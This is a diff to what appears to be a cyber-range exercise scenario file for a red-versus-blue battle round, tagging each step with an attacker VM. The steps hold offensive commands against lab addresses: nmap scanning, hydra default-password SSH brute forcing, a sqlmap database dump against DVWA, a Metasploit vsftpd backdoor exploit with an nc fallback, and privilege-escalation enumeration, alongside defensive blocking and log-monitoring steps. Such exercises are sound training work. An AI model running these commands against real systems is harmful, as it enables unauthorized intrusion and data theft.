@@ -30,6 +30,7 @@ steps:
     type: output_contains
     expect: open
     field: stdout
+  target_vm: attacker
   script: nmap -sV -T4 --top-ports 100 10.20.40.0/24 -oN /tmp/battle_scan.txt
   risk_level: low
 - order: 2
@@ -43,6 +44,7 @@ steps:
     type: output_contains
     expect: 'host:'
     field: stdout
+  target_vm: attacker
   script: hydra -l admin -p admin ssh://10.20.40.10 -t 2 -f && hydra -l root -p toor ssh://10.20.40.10 -t 2 -f && hydra -l msfadmin -p msfadmin ssh://10.20.40.10 -t 2 -f
   risk_level: medium
 - order: 3
@@ -60,6 +62,7 @@ steps:
     type: output_contains
     expect: Monitoring started
     field: stdout
+  target_vm: attacker
   script: 'tail -f /var/log/auth.log | grep --line-buffered -iE ''(fail|invalid|refused)'' &
 
     tail -f /var/log/suricata/fast.log &
@@ -78,6 +81,7 @@ steps:
     type: output_contains
     expect: 'Blocked:'
     field: stdout
+  target_vm: attacker
   script: 'ATTACKER_IP=10.20.30.10 && sudo nft add element inet filter blocklist { $ATTACKER_IP } 2>/dev/null || (sudo nft add set inet filter blocklist ''{ type ipv4_addr; }'' && sudo nft add rule inet
     filter input ip saddr @blocklist drop && sudo nft add element inet filter blocklist { $ATTACKER_IP }) && echo "Blocked: $ATTACKER_IP"'
   risk_level: low
@@ -92,6 +96,7 @@ steps:
     type: output_contains
     expect: sqlmap
     field: stdout
+  target_vm: attacker
   script: sqlmap -u 'http://10.20.40.10/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit' --cookie='security=low; PHPSESSID=test' --batch --dump --threads=5
   risk_level: medium
 - order: 6
@@ -105,6 +110,7 @@ steps:
     type: output_contains
     expect: FLAG
     field: stdout
+  target_vm: attacker
   script: find / -name 'flag*.txt' 2>/dev/null && cat /root/flag.txt 2>/dev/null && cat /home/*/flag.txt 2>/dev/null
   risk_level: medium
 - order: 7
@@ -118,6 +124,7 @@ steps:
     type: output_contains
     expect: alert
     field: stdout
+  target_vm: attacker
   script: cat /var/log/suricata/eve.json | jq -r 'select(.event_type=="alert") | "\(.timestamp) \(.alert.signature) from \(.src_ip)"' | tail -10
   risk_level: low
 - order: 8
@@ -145,6 +152,7 @@ steps:
     type: output_contains
     expect: WAF rules deployed
     field: stdout
+  target_vm: attacker
   script: 'cat > /tmp/.htaccess << ''EOF''
 
     RewriteEngine On
@@ -172,6 +180,7 @@ steps:
     type: output_contains
     expect: 10.20.40
     field: stdout
+  target_vm: attacker
   script: 'msfconsole -q -x ''use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 10.20.40.10; run; exit'' 2>/dev/null || echo ''Attempting alternative: nc -nv 10.20.40.10 6200'''
   risk_level: medium
 - order: 10
@@ -185,6 +194,7 @@ steps:
     type: output_contains
     expect: /
     field: stdout
+  target_vm: attacker
   script: find / -perm -4000 -type f 2>/dev/null | head -10 && sudo -l 2>/dev/null && cat /etc/crontab
   risk_level: medium
 - order: 11
@@ -199,6 +209,7 @@ steps:
     type: output_contains
     expect: active
     field: stdout
+  target_vm: attacker
   script: 'for svc in apache2 sshd mysql vsftpd; do status=$(systemctl is-active $svc 2>/dev/null); echo "$svc: $status"; if [ "$status" != "active" ]; then sudo systemctl restart $svc 2>/dev/null; fi;
     done'
   risk_level: low
@@ -214,6 +225,7 @@ steps:
     type: output_contains
     expect: root
     field: stdout
+  target_vm: attacker
   script: 'awk -F: ''$3==0'' /etc/passwd && grep -r ''nc\|bash\|python\|perl'' /var/spool/cron/ 2>/dev/null && find /home -name ''authorized_keys'' -exec cat {} \; 2>/dev/null && find /tmp /var/tmp -executable
     -type f 2>/dev/null'
   risk_level: low
@@ -229,6 +241,7 @@ steps:
     type: output_contains
     expect: Round 1
     field: stdout
+  target_vm: attacker
   script: 'curl -s http://10.20.50.1/api/scores 2>/dev/null || echo ''Score check - Round 1 complete'' && echo ''Red Team: Flags captured, access achieved'' && echo ''Blue Team: Services maintained, attacks
     detected'''
   risk_level: low
@@ -244,6 +257,7 @@ steps:
     type: output_contains
     expect: Role Swap
     field: stdout
+  target_vm: attacker
   script: 'echo ''=== Role Swap ==='' && echo ''Previous: Red Team → Now: Blue Team (or vice versa)'' && echo ''New objectives:'' && echo ''1. Apply lessons learned from Round 1'' && echo ''2. Use observed
     attack/defense patterns'' && echo ''3. Improve strategy based on experience'''
   risk_level: low
@@ -300,6 +314,7 @@ steps:
     type: file_exists
     expect: /tmp/battle_round1_report.txt
     field: filesystem
+  target_vm: attacker
   script: 'cat > /tmp/battle_round1_report.txt << ''EOF''
 
     === Battle Round 1 Report ===
